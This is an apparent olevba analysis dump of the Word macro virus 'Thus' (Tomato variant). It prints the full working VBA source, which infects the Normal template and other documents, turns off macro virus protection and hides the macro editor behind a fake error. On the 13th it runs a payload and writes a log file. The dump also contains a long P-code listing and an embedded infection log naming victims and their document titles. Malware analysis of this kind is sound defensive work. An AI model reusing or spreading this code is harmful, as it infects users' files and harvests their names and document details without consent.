olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.au
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.au - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Thus_001'
'---------------------------------------------------------------------
'Tomato
StartPos = 87
On Error GoTo Exit1
VirusProtection = False
SaveNormalPrompt = False
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If Day(Now) = 13 Then Trojan
If (ad.Lines(4, 1) <> "'Tomato") Or (ad.Lines(2, 1) = "''Thus_001'") Or (ad.Lines(2, 1) = "''Thus_001'") Then
    LogInfo
    If ad.CountOfLines > 0 Then ad.DeleteLines 1, ad.CountOfLines
    s = nt.Lines(1, nt.CountOfLines)
    ad.InsertLines 1, s
    ad.ReplaceLine 45, "Sub ViewVBCode1()"
    ad.ReplaceLine 49, "Sub ToolsMacro1()"
    virus_col = Val(Mid(nt.Lines(StartPos, 1), 9, 4)) + 1
    nt.ReplaceLine StartPos, Mid(nt.Lines(StartPos, 1), 1, 8) + Str(virus_col)
    ad.ReplaceLine StartPos, "' Êîïèÿ¹ 0000"
    ActiveDocument.Save
End If
If (nt.Lines(4, 1) <> "'Tomato") Or (nt.Lines(2, 1) = "''Thus_001'") Or (ad.Lines(2, 1) = "''Thus_001'") Then
    If nt.CountOfLines > 0 Then nt.DeleteLines 1, nt.CountOfLines
    s = ad.Lines(1, ad.CountOfLines)
    nt.InsertLines 1, s
    nt.ReplaceLine 45, "Sub ViewVBCode()"
    nt.ReplaceLine 49, "Sub ToolsMacro()"
    virus_col = Val(Mid(nt.Lines(StartPos, 1), 9, 4)) + 1
    nt.ReplaceLine StartPos, Mid(nt.Lines(StartPos, 1), 1, 8) + Str(virus_col)
End If
NormalTemplate.Save
Exit1:
End Sub

Private Sub Document_New()
    Document_Close
End Sub

Private Sub Document_Open()
    Document_Close
End Sub
 
Sub ViewVBCode1()
    MsgBox "Îøèáêà èíèöèàëèçàöè MS Visual Basic", vbCritical
End Sub

Sub ToolsMacro1()
    MsgBox "Îøèáêà èíèöèàëèçàöè MS Visual Basic", vbCritical
End Sub

Private Sub Trojan()
    Application.Caption = "Ñàìûé îòñòîéíûé äîêóìåíò"
    For I = 1 To 10
        Application.CommandBars.Item(I).Visible = False
    Next I
    ActiveDocument.Shapes.AddShape(6, 150, 150, 300, 300).Fill.ForeColor.RGB = RGB(255, 0, 0)
    ActiveDocument.Shapes.AddShape(1, 200, 260, 200, 70).Fill.ForeColor.RGB = RGB(255, 255, 255)
    ActiveDocument.Shapes.Item(2).TextFrame.TextRange.Font.Size = 46
    ActiveDocument.Shapes.Item(2).TextFrame.TextRange.Font.ColorIndex = wdRed
    ActiveDocument.Shapes.Item(2).TextFrame.TextRange.Text = "Ïîìèäîð"
    ActiveDocument.Save
End Sub

Private Sub LogInfo()
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    Log_s = "' " & Time & " - " & Format(Date, "dddd, d mmm yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & ActiveDocument.Name & Chr(13) & "' " & Application.UserAddress & Chr(13) & "' "
    FindFirstLog = 1
    While nt.Lines(FindFirstLog, 1) <> "' Log:"
        FindFirstLog = FindFirstLog + 1
    Wend
    If nt.CountOfLines > 315 Then nt.DeleteLines FindFirstLog + 1, 5
    nt.InsertLines nt.CountOfLines + 5, Log_s
    If Day(Now) = 13 Then
        Open "c:\Ïîìèäîð.log" For Output As #1
        Print #1, "Log ôàéë âèðóñà Ïîìèäîðêà"
        Print #1, "CopyRight (c) Lander Fox"
        Print #1, "All rigth reserved" + Chr(13)
        For I = FindFirstLog + 1 To nt.CountOfLines
            Print #1, nt.Lines(I, 1)
        Next I
        Close #1
    End If
End Sub

' Êîïèÿ¹ 0000
'
' Log:
' 8:19:53 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Òèòóë2.rtf
'
'
' 8:22:16 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Titul.doc
'
'
' 8:23:42 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Plug&Play.doc
'
'
' 9:55:40 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Êí-äèïë.doc
'
'
' 13:38:08 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Ingenerka.rtf
'
'
' 14:50:50 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' ËÈÒÅÐÀÒÓÐÀ.doc
'
'
' 17:22:00 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Ïðèëîæåíèå1.doc
'
'
' 17:25:05 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Äîêóìåíò1
'
'
' 17:28:31 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Ïðèëîæåíèå1.doc
'
'
' 11:34:43 - âîñêðåñåíüå, 4 èþí 2000
' Ï÷åëà Âàñÿ
' Äîêóìåíò1
'
'
' 12:40:31 - âîñêðåñåíüå, 4 èþí 2000
' Ï÷åëà Âàñÿ
' Äîêóìåíò1
'
'
' 12:44:40 - âîñêðåñåíüå, 4 èþí 2000
' Ï÷åëà Âàñÿ
' Äîêóìåíò1
'
'
' 12:44:56 - âîñêðåñåíüå, 4 èþí 2000
' Ï÷åëà Âàñÿ
' ãëàâà3.doc
'
'
' 13:26:25 - âîñêðåñåíüå, 4 èþí 2000
' Ï÷åëà Âàñÿ
' ÿ ëþáèìàÿ.rtf
'
'
' 13:42:07 - âîñêðåñåíüå, 4 èþí 2000
' Ï÷åëà Âàñÿ
' ZAJAV.DOC
'
'
' 16:53:21 - ïÿòíèöà, 2 èþí 2000
' Vadim
' Êí-äèïë.doc
'
'
' 17:15:28 - ïÿòíèöà, 2 èþí 2000
' Vadim
' Çàêëþ÷åíèå (äèï).doc
'
'
' 18:47:42 - ïÿòíèöà, 2 èþí 2000
' Vadim
' report_Ðàñ÷åò ôèí. ïëàíà.doc
'
'
' 8:38:25 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' Äîêóìåíò1
'
'
' 8:42:42 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' ïèñ îòãðÑÒÄ 23 05.doc
'
'
' 14:05:42 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' ÐÅ×Ü (äèï).doc
'
'
' 14:32:24 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' Ãëàâ.áóõ.ÒÄ ÂÇ Ëûñüâ 11.04.doc
'
'
' 15:07:54 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' Êîð÷àãàíîâó 17.01..doc
'
'
' 15:13:36 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' Ãëàâ.áóõ.ÒÄ ÂÇ Êîíñòð 19.04.doc
'
'
' 15:30:58 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' ÄÈÏËÎÌ.doc
'
'
' 18:54:44 - ñðåäà, 7 èþí 2000
' Sergey
' Ïðèáûëè -óáûòêè (äèï).doc
'
'
' 18:54:58 - ñðåäà, 7 èþí 2000
' Sergey
' Êýø-ôëî (äèï).doc
'
'
' 18:55:08 - ñðåäà, 7 èþí 2000
' Sergey
' Ôèíàíñîâûå ïîêàçàòåëè (äèï).doc
'
'
' 18:55:25 - ñðåäà, 7 èþí 2000
' Sergey
' Áàëàíñ (äèï).doc
'
'
' 18:55:46 - ñðåäà, 7 èþí 2000
' Sergey
' ÏËÀÍÎÂÀß ÊÀËÜÊÓËßÖÈß ÑÅÁÅÑÒÎÈÌÎÑÒÈ.doc
'
'
' 11:51:49 - ÷åòâåðã, 8 èþí 2000
' Sergey
' Ôèíàíñîâûå ïîêàçàòåëè (äèï).doc
'
'
' 11:51:58 - ÷åòâåðã, 8 èþí 2000
' Sergey
' Áàëàíñ (äèï).doc
'
'
' 11:52:09 - ÷åòâåðã, 8 èþí 2000
' Sergey
' ÏËÀÍÎÂÀß ÊÀËÜÊÓËßÖÈß ÑÅÁÅÑÒÎÈÌÎÑÒÈ.doc
'
'
' 10:46:12 - ïÿòíèöà, 9 èþí 2000
' Sergey
' MH000024.doc
'
'
' 10:58:49 - ïÿòíèöà, 9 èþí 2000
' Sergey
' MH000026.doc
'
'
' 9:46:43 - âòîðíèê, 13 èþí 2000
' Sergey
' Äîêóìåíò1.doc
'
'
' 9:47:47 - âòîðíèê, 13 èþí 2000
' Sergey
' Îðõèäåêòîìèÿ.doc
'
'
' 10:23:03 - âòîðíèê, 13 èþí 2000
' Sergey
' Ìèíèñòåðñòâî ñåëüñêîãî õîçÿéñòâà è ïðîäîâîëüñòâèÿ.doc
'
'
' 18:15:04 - Tuesday, 1 Aug 2000
' Replication System
' DOC10.DOC
'
'
' 18:15:15 - Tuesday, 1 Aug 2000
' Replication System
' DOC11.DOC
'
'
' 18:15:25 - Tuesday, 1 Aug 2000
' Replication System
' DOC12.DOC
'
'
' 18:15:33 - Tuesday, 1 Aug 2000
' Replication System
' DOC13.DOC
'
'
' 18:15:42 - Tuesday, 1 Aug 2000
' Replication System
' DOC14.DOC
'
'
' 18:15:51 - Tuesday, 1 Aug 2000
' Replication System
' DOC7.DOC
'
'
' 11:03:25 AM - Monday, 11 Sep 2000
' Ditry PC
' sample1.doc
'
'
' 11:23:01 PM - Wednesday, 29 Jan 1997
' ¡Jack! & ¡Rose! - T9999T :-(
' Document3
' ncaotri@yahoo.com
I love you. I miss you so much....!!!
'
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Thus.au
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15354 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x0009 "Thus_001'"
' Line #2:
' 	QuoteRem 0x0000 0x0045 "---------------------------------------------------------------------"
' Line #3:
' 	QuoteRem 0x0000 0x0006 "Tomato"
' Line #4:
' 	LitDI2 0x0057 
' 	St StartPos 
' Line #5:
' 	OnError Exit1 
' Line #6:
' 	LitVarSpecial (False)
' 	St VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	St SaveNormalPrompt 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set ad 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set nt 
' Line #10:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Trojan 0x0000 
' 	EndIf 
' Line #11:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "'Tomato"
' 	Ne 
' 	Paren 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000B "''Thus_001'"
' 	Eq 
' 	Paren 
' 	Or 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000B "''Thus_001'"
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #12:
' 	ArgsCall LogInfo 0x0000 
' Line #13:
' 	Ld ad 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' Line #15:
' 	LitDI2 0x0001 
' 	Ld s 
' 	Ld ad 
' 	ArgsMemCall InsertLines 0x0002 
' Line #16:
' 	LitDI2 0x002D 
' 	LitStr 0x0011 "Sub ViewVBCode1()"
' 	Ld ad 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #17:
' 	LitDI2 0x0031 
' 	LitStr 0x0011 "Sub ToolsMacro1()"
' 	Ld ad 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #18:
' 	Ld StartPos 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0009 
' 	LitDI2 0x0004 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St virus_col 
' Line #19:
' 	Ld StartPos 
' 	Ld StartPos 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	Ld virus_col 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld nt 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #20:
' 	Ld StartPos 
' 	LitStr 0x000D "' Êîïèÿ¹ 0000"
' 	Ld ad 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #21:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "'Tomato"
' 	Ne 
' 	Paren 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000B "''Thus_001'"
' 	Eq 
' 	Paren 
' 	Or 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000B "''Thus_001'"
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #24:
' 	Ld nt 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld s 
' 	Ld nt 
' 	ArgsMemCall InsertLines 0x0002 
' Line #27:
' 	LitDI2 0x002D 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Ld nt 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #28:
' 	LitDI2 0x0031 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Ld nt 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #29:
' 	Ld StartPos 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0009 
' 	LitDI2 0x0004 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St virus_col 
' Line #30:
' 	Ld StartPos 
' 	Ld StartPos 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	Ld virus_col 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld nt 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #33:
' 	Label Exit1 
' Line #34:
' 	EndSub 
' Line #35:
' Line #36:
' 	FuncDefn (Private Sub Document_New())
' Line #37:
' 	ArgsCall Document_Close 0x0000 
' Line #38:
' 	EndSub 
' Line #39:
' Line #40:
' 	FuncDefn (Private Sub Document_Open())
' Line #41:
' 	ArgsCall Document_Close 0x0000 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Sub ViewVBCode1())
' Line #45:
' 	LitStr 0x0023 "Îøèáêà èíèöèàëèçàöè MS Visual Basic"
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #46:
' 	EndSub 
' Line #47:
' Line #48:
' 	FuncDefn (Sub ToolsMacro1())
' Line #49:
' 	LitStr 0x0023 "Îøèáêà èíèöèàëèçàöè MS Visual Basic"
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #50:
' 	EndSub 
' Line #51:
' Line #52:
' 	FuncDefn (Private Sub Trojan())
' Line #53:
' 	LitStr 0x0018 "Ñàìûé îòñòîéíûé äîêóìåíò"
' 	Ld Application 
' 	MemSt Caption 
' Line #54:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #55:
' 	LitVarSpecial (False)
' 	Ld I 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Visible 
' Line #56:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	LitDI2 0x0006 
' 	LitDI2 0x0096 
' 	LitDI2 0x0096 
' 	LitDI2 0x012C 
' 	LitDI2 0x012C 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #58:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x00C8 
' 	LitDI2 0x0104 
' 	LitDI2 0x00C8 
' 	LitDI2 0x0046 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #59:
' 	LitDI2 0x002E 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TextFrame 
' 	MemLd TextRange 
' 	MemLd Font 
' 	MemSt Size 
' Line #60:
' 	Ld wdRed 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TextFrame 
' 	MemLd TextRange 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #61:
' 	LitStr 0x0007 "Ïîìèäîð"
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TextFrame 
' 	MemLd TextRange 
' 	MemSt Then 
' Line #62:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Private Sub LogInfo())
' Line #66:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set nt 
' Line #67:
' 	LitStr 0x0002 "' "
' 	Ld Time 
' 	Concat 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St Log_s 
' Line #68:
' 	LitDI2 0x0001 
' 	St FindFirstLog 
' Line #69:
' 	Ld FindFirstLog 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "' Log:"
' 	Ne 
' 	While 
' Line #70:
' 	Ld FindFirstLog 
' 	LitDI2 0x0001 
' 	Add 
' 	St FindFirstLog 
' Line #71:
' 	Wend 
' Line #72:
' 	Ld nt 
' 	MemLd CountOfLines 
' 	LitDI2 0x013B 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld FindFirstLog 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	Ld nt 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #73:
' 	Ld nt 
' 	MemLd CountOfLines 
' 	LitDI2 0x0005 
' 	Add 
' 	Ld Log_s 
' 	Ld nt 
' 	ArgsMemCall InsertLines 0x0002 
' Line #74:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	IfBlock 
' Line #75:
' 	LitStr 0x000E "c:\Ïîìèäîð.log"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "Log ôàéë âèðóñà Ïîìèäîðêà"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "CopyRight (c) Lander Fox"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "All rigth reserved"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #79:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	Ld FindFirstLog 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld nt 
' 	MemLd CountOfLines 
' 	For 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #81:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	EndSub 
' Line #85:
' Line #86:
' 	QuoteRem 0x0000 0x000C " Êîïèÿ¹ 0000"
' Line #87:
' 	QuoteRem 0x0000 0x0000 ""
' Line #88:
' 	QuoteRem 0x0000 0x0005 " Log:"
' Line #89:
' 	QuoteRem 0x0000 0x001E " 8:19:53 - ñóááîòà, 3 èþí 2000"
' Line #90:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #91:
' 	QuoteRem 0x0000 0x000B " Òèòóë2.rtf"
' Line #92:
' 	QuoteRem 0x0000 0x0000 ""
' Line #93:
' 	QuoteRem 0x0000 0x0000 ""
' Line #94:
' 	QuoteRem 0x0000 0x001E " 8:22:16 - ñóááîòà, 3 èþí 2000"
' Line #95:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #96:
' 	QuoteRem 0x0000 0x000A " Titul.doc"
' Line #97:
' 	QuoteRem 0x0000 0x0000 ""
' Line #98:
' 	QuoteRem 0x0000 0x0000 ""
' Line #99:
' 	QuoteRem 0x0000 0x001E " 8:23:42 - ñóááîòà, 3 èþí 2000"
' Line #100:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #101:
' 	QuoteRem 0x0000 0x000E " Plug&Play.doc"
' Line #102:
' 	QuoteRem 0x0000 0x0000 ""
' Line #103:
' 	QuoteRem 0x0000 0x0000 ""
' Line #104:
' 	QuoteRem 0x0000 0x001E " 9:55:40 - ñóááîòà, 3 èþí 2000"
' Line #105:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #106:
' 	QuoteRem 0x0000 0x000C " Êí-äèïë.doc"
' Line #107:
' 	QuoteRem 0x0000 0x0000 ""
' Line #108:
' 	QuoteRem 0x0000 0x0000 ""
' Line #109:
' 	QuoteRem 0x0000 0x001F " 13:38:08 - ñóááîòà, 3 èþí 2000"
' Line #110:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #111:
' 	QuoteRem 0x0000 0x000E " Ingenerka.rtf"
' Line #112:
' 	QuoteRem 0x0000 0x0000 ""
' Line #113:
' 	QuoteRem 0x0000 0x0000 ""
' Line #114:
' 	QuoteRem 0x0000 0x001F " 14:50:50 - ñóááîòà, 3 èþí 2000"
' Line #115:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #116:
' 	QuoteRem 0x0000 0x000F " ËÈÒÅÐÀÒÓÐÀ.doc"
' Line #117:
' 	QuoteRem 0x0000 0x0000 ""
' Line #118:
' 	QuoteRem 0x0000 0x0000 ""
' Line #119:
' 	QuoteRem 0x0000 0x001F " 17:22:00 - ñóááîòà, 3 èþí 2000"
' Line #120:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #121:
' 	QuoteRem 0x0000 0x0010 " Ïðèëîæåíèå1.doc"
' Line #122:
' 	QuoteRem 0x0000 0x0000 ""
' Line #123:
' 	QuoteRem 0x0000 0x0000 ""
' Line #124:
' 	QuoteRem 0x0000 0x001F " 17:25:05 - ñóááîòà, 3 èþí 2000"
' Line #125:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #126:
' 	QuoteRem 0x0000 0x000A " Äîêóìåíò1"
' Line #127:
' 	QuoteRem 0x0000 0x0000 ""
' Line #128:
' 	QuoteRem 0x0000 0x0000 ""
' Line #129:
' 	QuoteRem 0x0000 0x001F " 17:28:31 - ñóááîòà, 3 èþí 2000"
' Line #130:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #131:
' 	QuoteRem 0x0000 0x0010 " Ïðèëîæåíèå1.doc"
' Line #132:
' 	QuoteRem 0x0000 0x0000 ""
' Line #133:
' 	QuoteRem 0x0000 0x0000 ""
' Line #134:
' 	QuoteRem 0x0000 0x0023 " 11:34:43 - âîñêðåñåíüå, 4 èþí 2000"
' Line #135:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #136:
' 	QuoteRem 0x0000 0x000A " Äîêóìåíò1"
' Line #137:
' 	QuoteRem 0x0000 0x0000 ""
' Line #138:
' 	QuoteRem 0x0000 0x0000 ""
' Line #139:
' 	QuoteRem 0x0000 0x0023 " 12:40:31 - âîñêðåñåíüå, 4 èþí 2000"
' Line #140:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #141:
' 	QuoteRem 0x0000 0x000A " Äîêóìåíò1"
' Line #142:
' 	QuoteRem 0x0000 0x0000 ""
' Line #143:
' 	QuoteRem 0x0000 0x0000 ""
' Line #144:
' 	QuoteRem 0x0000 0x0023 " 12:44:40 - âîñêðåñåíüå, 4 èþí 2000"
' Line #145:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #146:
' 	QuoteRem 0x0000 0x000A " Äîêóìåíò1"
' Line #147:
' 	QuoteRem 0x0000 0x0000 ""
' Line #148:
' 	QuoteRem 0x0000 0x0000 ""
' Line #149:
' 	QuoteRem 0x0000 0x0023 " 12:44:56 - âîñêðåñåíüå, 4 èþí 2000"
' Line #150:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #151:
' 	QuoteRem 0x0000 0x000B " ãëàâà3.doc"
' Line #152:
' 	QuoteRem 0x0000 0x0000 ""
' Line #153:
' 	QuoteRem 0x0000 0x0000 ""
' Line #154:
' 	QuoteRem 0x0000 0x0023 " 13:26:25 - âîñêðåñåíüå, 4 èþí 2000"
' Line #155:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #156:
' 	QuoteRem 0x0000 0x000E " ÿ ëþáèìàÿ.rtf"
' Line #157:
' 	QuoteRem 0x0000 0x0000 ""
' Line #158:
' 	QuoteRem 0x0000 0x0000 ""
' Line #159:
' 	QuoteRem 0x0000 0x0023 " 13:42:07 - âîñêðåñåíüå, 4 èþí 2000"
' Line #160:
' 	QuoteRem 0x0000 0x000B " Ï÷åëà Âàñÿ"
' Line #161:
' 	QuoteRem 0x0000 0x000A " ZAJAV.DOC"
' Line #162:
' 	QuoteRem 0x0000 0x0000 ""
